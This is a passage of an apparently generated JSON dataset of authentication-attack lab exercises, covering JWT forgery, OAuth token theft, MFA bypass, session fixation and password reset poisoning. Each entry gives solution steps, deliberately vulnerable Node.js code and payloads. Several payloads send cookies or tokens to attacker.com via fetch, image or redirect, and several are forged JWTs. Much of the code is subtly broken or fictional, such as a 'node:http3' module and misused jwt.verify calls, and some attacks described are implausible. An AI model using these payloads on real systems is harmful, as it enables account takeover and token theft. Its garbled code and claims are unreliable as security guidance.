      "GET /chat HTTP/1.1\r\nHost: victim.com\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Protocol: bearer malicious_token\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/3 connection migration",
    "Lab Description": "The HTTP/3 implementation assigns session tokens based on QUIC connection IDs. The application [reuses session state across migrated connections]. To solve: Fixate session by forcing connection migration before authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/3 support using Chrome DevTools",
      "Capture initial connection handshake",
      "Trigger connection migration by changing networks",
      "Authenticate during migrated connection",
      "Reuse session from original connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('node:http3');const app = http3.createServer((req, res) => {if(!req.session) req.session = uuidv4();res.end('Connected');});app.listen(3000);",
    "payloads": [
      "GET / HTTP/3\r\nHost: victim.com\r\nConnection-ID: fixed123\r\n\r\n",
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection-ID: fixed123\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebAuthn replay attack",
    "Lab Description": "The WebAuthn implementation fails to validate challenge nonces properly. The application [accepts reused authentication assertions]. To solve: Capture valid WebAuthn assertion and replay it to bypass MFA.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebAuthn authentication flow using Burp Suite",
      "Capture valid authentication assertion",
      "Modify assertion timestamp and counter",
      "Replay assertion to authentication endpoint",
      "Observe successful MFA bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/webauthn/verify', (req, res) => {if(validateAssertion(req.body.assertion)) res.send('Verified');else res.status(403).send('Invalid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"assertion\":{\"authenticatorData\":\"...\",\"clientDataJSON\":\"...\",\"signature\":\"...\"}}",
      "{\"assertion\":{\"authenticatorData\":\"malicious\",\"clientDataJSON\":\"data\",\"signature\":\"fake\"}}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-sensitive cookie parsing",
    "Lab Description": "The authentication system processes cookies with case-sensitive inconsistencies. The application [treats 'Session' and 'session' as different cookies]. To solve: Perform credential stuffing with case-varied cookie names to bypass authentication.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify authentication cookie using OWASP ZAP",
      "Test cookie name case sensitivity",
      "Load credential lists into Burp Intruder",
      "Configure payload processing for case variations",
      "Identify successful authentications"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/admin', (req, res) => {if(req.cookies.Session === 'valid') res.send('Admin panel');else res.status(403).send('Forbidden');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "Cookie: Session=valid",
      "Cookie: session=valid"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via key ID confusion",
    "Lab Description": "The JWT implementation incorrectly processes key IDs from untrusted sources. The application [uses kid header to select verification keys without proper validation]. To solve: Inject malicious kid header pointing to attacker-controlled key to forge valid tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Identify kid header in token structure",
      "Set up attacker-controlled JWKS endpoint",
      "Modify kid header to reference malicious key",
      "Sign token with attacker's private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;const key = getKeyFromKid(token.header.kid);jwt.verify(token, key);res.send('Admin access');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImF0dGFja2VyLWNvbnRyb2xsZWQta2V5In0.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Im1hbGljaW91cy1rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via iframe CSP bypass",
    "Lab Description": "The OAuth token endpoint is embedded in iframes with overly permissive CSP headers. The application [leaks tokens through postMessage events]. To solve: Craft malicious page that extracts tokens via iframe CSP bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Analyze CSP headers for unsafe-eval or unsafe-inline directives",
      "Create malicious page embedding target iframe",
      "Inject JavaScript to intercept postMessage events",
      "Extract OAuth tokens from message data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self' 'unsafe-inline'\");res.send(`<script>parent.postMessage({token:'secret123'},'*')</script>`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/iframe\" onload=\"window.addEventListener('message',e=>document.location='http://attacker.com/?token='+e.data.token)\"></iframe>",
      "<script>var iframe=document.createElement('iframe');iframe.src='https://victim.com/oauth/iframe';document.body.appendChild(iframe);window.addEventListener('message',e=>fetch('http://attacker.com',{method:'POST',body:e.data.token}));</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 stream prioritization",
    "Lab Description": "The HTTP/2 implementation assigns sessions based on stream dependencies. The application [reuses session state across dependent streams]. To solve: Craft HTTP/2 requests with malicious stream dependencies to fixate sessions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify HTTP/2 support using Chrome DevTools",
      "Capture initial connection handshake",
      "Construct requests with malicious stream dependencies",
      "Fixate session cookie in parent stream",
      "Force victim to authenticate in dependent stream"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');const fs = require('fs');const server = http2.createSecureServer({cert:fs.readFileSync('server.crt'),key:fs.readFileSync('server.key')});server.on('stream', (stream, headers) => {if(headers[':path'] === '/login') stream.session = uuidv4();});server.listen(3000);",
    "payloads": [
      "GET / HTTP/2\r\nHost: victim.com\r\n\r\n",
      "POST /login HTTP/2\r\nHost: victim.com\r\nStream-Dependency: 1\r\n\r\nusername=admin&password=admin"
    ]
  },
  {
    "Lab scenario": "MFA bypass via TOTP prediction",
    "Lab Description": "The TOTP implementation uses insufficient entropy in seed generation. The application [generates predictable OTP sequences]. To solve: Capture multiple OTPs and reverse-engineer the generation algorithm to predict valid codes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enroll multiple test accounts and collect their TOTP seeds",
      "Analyze seed patterns using Python scripts",
      "Reverse-engineer seed generation formula",
      "Calculate victim's likely seed based on username",
      "Generate valid TOTP codes using predicted seed"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const speakeasy = require('speakeasy');const app = express();app.post('/mfa/enroll', (req, res) => {const seed = Buffer.from(req.body.username).toString('hex').slice(0,10);const otp = speakeasy.generateSecret({seed});res.json(otp);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"username\":\"carlos\",\"code\":\"123456\"}",
      "{\"username\":\"admin\",\"code\":\"654321\"}"
    ]
  },
  {
    "Lab scenario": "JWT authentication bypass via header parameter injection",
    "Lab Description": "The JWT implementation fails to properly sanitize header parameters before verification. The application [processes malicious x5u header values as valid certificate URLs]. To solve: Inject x5u header pointing to attacker-controlled certificate to bypass signature validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite",
      "Add x5u header with URL to malicious certificate",
      "Host crafted X.509 certificate on attacker server",
      "Sign token with certificate's private key",
      "Submit forged token to authentication endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/verify', (req, res) => {const options = {algorithms: ['RS256'],complete: true};const decoded = jwt.verify(req.body.token, null, options);res.send('Valid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vZXZpbC5jb20vZmFrZS5jZXIifQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via DNS prefetch",
    "Lab Description": "The OAuth implementation includes tokens in external resource URLs that trigger DNS prefetching. The application [leaks tokens through DNS lookups]. To solve: Craft malicious page with resource links containing tokens to capture them via DNS exfiltration.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in resource URLs",
      "Set up DNS logging server",
      "Create page with prefetch links containing tokens",
      "Capture tokens from DNS queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<link rel=\"dns-prefetch\" href=\"//${token}.attacker.com\">`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<link rel=\"dns-prefetch\" href=\"//eyJhbGciOi.attacker.com\">",
      "<link rel=\"preconnect\" href=\"//token-leak.attacker.com/?t=eyJhbGciOi\">"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport session IDs",
    "Lab Description": "The WebTransport implementation assigns session tokens before authentication. The application [uses connection IDs as session tokens]. To solve: Establish WebTransport connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection using Chrome DevTools",
      "Note session ID in initial handshake",
      "Create malicious page that forces victim authentication",
      "Monitor data streams for victim's session",
      "Hijack authenticated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');const wt = new WebTransport('https://localhost:3000');wt.ready.then(() => {wt.session = uuidv4();});",
    "payloads": [
      "CONNECT / HTTP/3\r\nHost: victim.com\r\nSec-WebTransport-Protocol: session-fixation\r\n\r\n",
      "GET /auth HTTP/3\r\nHost: victim.com\r\nSession-ID: malicious123\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter tampering",
    "Lab Description": "The MFA verification relies on client-supplied state parameters. The application [trusts state parameters without server-side validation]. To solve: Modify state parameter to bypass verification after initial MFA challenge.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Capture state parameter value",
      "Submit invalid verification code",
      "Modify state parameter in final verification request",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/mfa/verify', (req, res) => {if(req.body.state === 'verified') res.send('Success');else res.status(403).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"code\":\"111111\",\"state\":\"pending\"}",
      "{\"code\":\"111111\",\"state\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via HTTP/3 connection reuse",
    "Lab Description": "The authentication system reuses HTTP/3 connections for multiple requests. The application [maintains session state across requests on same connection]. To solve: Perform credential stuffing by reusing established connections to bypass rate limits.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify HTTP/3 support using Chrome DevTools",
      "Establish persistent connection to target",
      "Load credential lists into Burp Intruder",
      "Configure Intruder to reuse HTTP/3 connection",
      "Execute high-volume credential stuffing attack"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http3 = require('node:http3');const server = http3.createServer((req, res) => {if(!req.connection.session) req.connection.session = uuidv4();res.end('Connected');});server.listen(3000);",
    "payloads": [
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection: keep-alive\r\n\r\nusername=admin&password=admin",
      "POST /login HTTP/3\r\nHost: victim.com\r\nConnection: reuse\r\n\r\nusername=user&password=password"
    ]
  },
  {
    "Lab scenario": "JWT algorithm switching vulnerability in REST API",
    "Lab Description": "The lab's authentication system uses JWTs with flawed algorithm validation. The application accepts unsigned tokens when the algorithm is switched to 'none'. To solve: forge a valid JWT for the admin user by exploiting algorithm confusion.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept login request with Burp Suite to capture a valid JWT",
      "Decode the JWT using jwt.io to analyze structure and claims",
      "Modify the algorithm header to 'none' and remove the signature",
      "Change the 'sub' claim to 'admin' and 'role' to 'administrator'",
      "Submit the modified token in Authorization header to access admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];const decoded = jwt.verify(token, null, { algorithms: ['HS256', 'none'] });if (decoded.role === 'administrator') return res.send('Admin panel');res.status(403).send('Forbidden');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ",
      "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicHJpdmlsZWdlIjoiYWRtaW4ifQ"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in SPA",
    "Lab Description": "The OAuth implementation leaks authorization codes through referer headers when loading external resources. The application doesn't validate the redirect_uri properly. To solve: steal an OAuth token by intercepting the referer header and gain access to the victim's data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept OAuth flow initiation",
      "Inject malicious JavaScript that loads an attacker-controlled image",
      "Capture the authorization code from referer header in server logs",
      "Exchange the stolen code for an access token at the token endpoint",
      "Use the token to query the userinfo endpoint for sensitive data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;if(code) return res.send('<script>new Image().src=\"https://attacker.com/steal?ref=\"+encodeURIComponent(document.referrer)</script>');res.send('Invalid code');});app.get('/userinfo', (req, res) => {if(req.headers.authorization === 'Bearer valid-token') return res.json({email: 'admin@vuln.com'});res.status(401).send('Unauthorized');});app.listen(3000);",
    "payloads": [
      "<img src=x onerror=this.src='http://attacker.com/?leak='+encodeURIComponent(document.referrer)>",
      "<script>fetch('http://attacker.com/collect?data='+btoa(document.cookie))</script>",
      "<link rel=\"stylesheet\" href=\"http://attacker.com/?stolen=\"+document.location.href>"
    ]
  },
  {
    "Lab scenario": "GraphQL batching attack on auth mutation",
    "Lab Description": "The GraphQL endpoint processes authentication mutations in batches without rate limiting. The application fails to track login attempts across batched requests. To solve: perform a credential stuffing attack by sending 1000 password guesses in a single GraphQL batch request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture login mutation with Postman to analyze GraphQL schema",
      "Create a batch request with 1000 login attempts using common passwords",
      "Use Burp Intruder to automate the attack with different username/password combinations",
      "Identify successful login by searching for 200 OK responses with valid session cookies",
      "Extract session cookie and access protected resources"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');const typeDefs = gql`type Mutation {login(username: String!, password: String!): AuthPayload}`;const resolvers = {Mutation: {login: (_, args) => {if(args.password === 'correct') return {token: 'valid'};throw new Error('Invalid');}}};const server = new ApolloServer({ typeDefs, resolvers });server.applyMiddleware({ app });app.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation($input:LoginInput!){login(input:$input){token}}\",\"variables\":{\"input\":{\"username\":\"admin\",\"password\":\"password1\"}}}]",
      "{\"query\":\"mutation{login1:login(username:\\\"admin\\\",password:\\\"123456\\\"){token} login2:login(username:\\\"admin\\\",password:\\\"qwerty\\\"){token}}\"}",
      "{\"query\":\"mutation($pass:String!){login(username:\\\"admin\\\",password:$pass){token}}\",\"variables\":{\"pass\":\"admin123\"}}"
    ]
  },
  {
    "Lab scenario": "Session fixation via pre-authenticated JWT in SOAP API",
    "Lab Description": "The SOAP-based authentication service issues JWTs before email verification is complete. The application doesn't invalidate pre-verification tokens after verification. To solve: fixate a session by obtaining a pre-verification token, completing verification, then using the original token to access the account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept account registration request with Burp Suite",
      "Extract the JWT from the response before email verification",
      "Complete the email verification process in a separate session",
      "Reuse the original JWT to bypass authentication checks",
      "Access privileged endpoints with the pre-verification token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/register', (req, res) => {const token = jwt.sign({email: req.body.email, verified: false}, 'secret', {expiresIn: '1h'});res.send(token);});app.post('/verify-email', (req, res) => {const token = req.body.token;jwt.verify(token, 'secret', (err, decoded) => {if(err) return res.status(400).send('Invalid');decoded.verified = true;res.send(jwt.sign(decoded, 'secret'));});});app.get('/account', (req, res) => {const token = req.headers.authorization;jwt.verify(token, 'secret', (err, decoded) => {if(!err && decoded.email) return res.send('Account data');res.status(401).send('Unauthorized');});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NTQyMzQ1NjB9.9QJhZvLqzVj5v5X5d5X5d5X5d5X5d5X5d5X5d5X5d5X",
      "<soap:Envelope><soap:Header><wsse:Security><wsse:UsernameToken><wsse:Username>admin</wsse:Username><wsse:Password>pre-verified-token</wsse:Password></wsse:UsernameToken></wsse:Security></soap:Header></soap:Envelope>",
      "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGV4YW1wbGUuY29tIiwidmVyaWZpZWQiOmZhbHNlLCJpYXQiOjE2NTQyMzQ1NjB9.9QJhZvLqzVj5v5X5d5X5d5X5d5X5d5X5d5X5d5X5d5X\"}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The multi-factor authentication flow can be bypassed by manipulating the status parameter in the verification request. The application fails to validate the MFA completion state server-side. To solve: intercept the MFA verification process and modify the status parameter to 'verified' before the code is validated.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Log in with valid credentials using Burp Suite",
      "Intercept the MFA initiation request and note the session token",
      "Forward the request but don't submit the verification code",
      "Manually craft a request to /verify-mfa with status=verified",
      "Access protected resources with the bypassed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());let sessions = {};app.post('/verify-mfa', (req, res) => {const { sessionId, code, status } = req.body;if(status === 'verified' || (sessions[sessionId] && sessions[sessionId] === code)) {return res.send({ token: 'valid-token' });}res.status(403).send('Invalid MFA');});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"123\",\"status\":\"verified\"}",
      "sessionId=123&status=verified",
      "<request><sessionId>123</sessionId><status>verified</status></request>"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The JWT validation service vulnerable to key path traversal via kid header. The application loads verification keys from filesystem without sanitization. To solve: forge admin token by forcing system to use public key from predictable location.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze kid header",
      "Modify kid to point to /etc/passwd and observe error leakage",
      "Craft kid header targeting /dev/null to trigger key load failure",
      "Switch to known public key location like /var/www/public.key",
      "Sign modified token with attacker-generated key matching public key"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, (header, callback) => {fs.readFile('/keys/'+header.kid, (err, key) => {callback(null, key);});});if(decoded.role === 'admin') res.send('Admin access');} catch(e) {res.status(500).send(e.message);}});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii92YXIvd3d3L3B1YmxpYy5rZXkifQ.eyJyb2xlIjoiYWRtaW4ifQ.real-signature",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF in social login flow",
    "Lab Description": "The OAuth implementation fails to validate state parameter in callback handler. The application accepts any state value after initial redirect. To solve: craft malicious link that authenticates victim to attacker's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify state parameter",
      "Capture valid authentication request and remove state parameter",
      "Observe system still completes authentication without state",
      "Construct phishing URL with attacker-controlled state value",
      "Lure victim to click link while attacker maintains session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const code = req.query.code;const state = req.query.state || 'default';req.session.state = state;res.redirect('/profile?state='+state);});app.get('/profile', (req, res) => {if(req.query.state === req.session.state) res.send('Profile data');else res.send('Invalid state');});app.listen(3000);",
    "payloads": [
      "https://victim.com/oauth/callback?code=123&state=attacker_value",
      "<iframe src=\"https://victim.com/oauth/authorize?response_type=code&client_id=client&state=attacker_value\">",
      "javascript:fetch('https://victim.com/oauth/callback?code=stolen&state=attacker_value')"
    ]
  },
  {
    "Lab scenario": "Session fixation via JSONP callback parameter",
    "Lab Description": "The JSONP endpoint leaks session tokens through callback parameter reflection. The application embeds sensitive data in JavaScript responses. To solve: fixate victim's session by crafting malicious JSONP request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover JSONP endpoint using Burp Suite scanner",
      "Analyze response containing session token in callback",
      "Craft HTML page with malicious callback function",
      "Induce victim to visit page which steals their session",
      "Use captured token to impersonate victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/userinfo', (req, res) => {const callback = req.query.callback || 'callback';res.set('Content-Type', 'application/javascript');res.send(callback+'({token: \"'+req.session.token+'\"});');});app.listen(3000);",
    "payloads": [
      "<script src=\"https://victim.com/userinfo?callback=stealToken\"></script>",
      "function stealToken(data){document.location='https://attacker.com/?token='+data.token;}",
      "<script>function exfil(data){new Image().src='http://attacker.com/'+data.token;}</script><script src='https://victim.com/userinfo?callback=exfil'></script>"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via X-Forwarded-Host",
    "Lab Description": "The password reset functionality trusts X-Forwarded-Host header for link generation. The application doesn't validate host headers against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Add X-Forwarded-Host: attacker.com header",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const host = req.headers['x-forwarded-host'] || req.headers.host;const token = generateToken();res.send('Reset link: https://'+host+'/reset?token='+token);});app.listen(3000);",
    "payloads": [
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com",
      "GET /reset?token=stolen-token HTTP/1.1",
      "POST /reset HTTP/1.1\nHost: victim.com\nX-Forwarded-Host: attacker.com"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Scenario": "The JWT validation accepts arbitrary jku headers pointing to external keys. The application doesn't restrict key server locations. To solve: host malicious public key and forge valid token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid JWT and note jku header support",
      "Generate RSA key pair using OpenSSL",
      "Host public key on attacker-controlled server",
      "Craft token with jku pointing to malicious key",
      "Sign token with private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;const decoded = jwt.verify(token, {complete: true}, {algorithms: ['RS256']});fetch(decoded.header.jku).then(key => {jwt.verify(token, key);});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2tleS5qc29uIn0.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMua2V5In0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImpydSI6Imh0dHBzOi8vZXZpbC5jb20va2V5In0.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "JWT x5u header SSRF in banking API",
    "Lab Description": "The JWT validation vulnerable to SSRF via x5u header fetching external certificates. The application processes x5u URLs without proper validation. To solve: forge admin token by forcing server to fetch verification certificate from attacker-controlled domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT with Burp Suite and analyze x5u header support",
      "Set up malicious HTTPS server with self-signed certificate",
      "Craft JWT with x5u pointing to attacker server",
      "Capture outgoing request from validation server",
      "Sign token with matching private key and submit"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const https = require('https');const app = express();app.get('/transfer', (req, res) => {const token = req.headers.authorization;jwt.verify(token, {complete:true}, (err, decoded) => {if(err) return res.status(403).send('Invalid token');if(decoded.header.x5u) {https.get(decoded.header.x5u, cert => {jwt.verify(token, cert, {algorithms:['RS256']});});}if(decoded.payload.role==='admin') res.send('Transfer approved');});});app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2NlcnQucGVtIn0.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly8xMjcuMC4wLjE6ODA4MC9tYWxpY2lvdXMucGVtIn0.eyJhZG1pbiI6dHJ1ZX0.fake-signature",
      "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5jb20vY2VydCJ9.eyJhY2Nlc3MiOiJhZG1pbiJ9.fake-signature"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via parameter pollution",
    "Lab Description": "The OAuth token endpoint vulnerable to parameter pollution in redirect_uri. The application processes multiple redirect_uri parameters inconsistently. To solve: steal authorization code by injecting secondary redirect_uri pointing to attacker server.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze OAuth flow with OWASP ZAP to identify redirect_uri usage",
      "Intercept authorization request and duplicate redirect_uri parameter",
      "Set first redirect_uri to legitimate value and second to attacker domain",
      "Capture authorization code sent to malicious endpoint",
      "Exchange code for access token at legitimate token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/authorize', (req, res) => {const uris = Array.isArray(req.query.redirect_uri) ? req.query.redirect_uri : [req.query.redirect_uri];res.redirect(uris[0]+'?code=123');});app.listen(3000);",
    "payloads": [
      "/oauth/authorize?client_id=legit&redirect_uri=https://client.com&redirect_uri=https://attacker.com",
      "/oauth/authorize?client_id=legit&redirect_uri[]=https://client.com&redirect_uri[]=https://attacker.com",
      "/oauth/authorize?client_id=legit&redirect_uri=https%3A%2F%2Fclient.com&redirect_uri=https%3A%2F%2Fattacker.com"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake",
    "Lab Description": "The WebSocket connection assigns sessions based on handshake headers. The application reuses existing session cookies without regeneration. To solve: fixate victim's session by forcing WebSocket connection with predetermined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebSocket handshake request with Burp Suite",
      "Note session cookie assignment during upgrade",
      "Craft malicious page initiating WebSocket with fixed session",
      "Induce victim to visit page while maintaining connection",
      "Hijack authenticated session through WebSocket channel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({ noServer: true });app.get('/chat', (req, res) => {res.cookie('session', req.query.sid||generateId());res.sendFile('chat.html');});wss.on('connection', ws => {ws.send('Connected as '+ws.upgradeReq.headers.cookie);});app.listen(3000);",
    "payloads": [
      "new WebSocket('ws://victim.com/chat','session=attacker_sid')",
      "<script>const ws = new WebSocket('ws://victim.com/chat');ws.onopen=()=>{document.cookie='session=attacker_sid'}</script>",
      "fetch('http://victim.com/chat?sid=attacker_sid')"
    ]
  },
  {
    "Lab scenario": "Password reset poisoning via Host header",
    "Lab Description": "The password reset functionality trusts dynamic Host header for link generation. The application doesn't validate host against allowed domains. To solve: poison reset link to point to attacker server and capture token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept password reset request with Burp Suite",
      "Modify Host header to attacker.com",
      "Submit request and observe poisoned reset link",
      "Wait for victim to click link and capture token",
      "Use token to reset victim's password"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.post('/reset', (req, res) => {const token = generateToken();res.send(`Reset link: https://${req.headers.host}/reset?token=${token}`);});app.listen(3000);",
